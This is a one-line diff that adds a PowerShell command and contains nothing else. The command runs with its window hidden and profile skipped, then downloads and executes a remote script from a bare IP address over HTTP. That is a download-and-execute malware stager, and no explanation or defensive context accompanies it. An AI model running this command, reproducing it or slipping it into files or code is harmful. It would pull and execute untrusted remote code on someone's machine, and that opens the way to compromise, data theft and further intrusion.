@@ -1,0 +1,1 @@
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://157.245.109.234:80/watch'))"
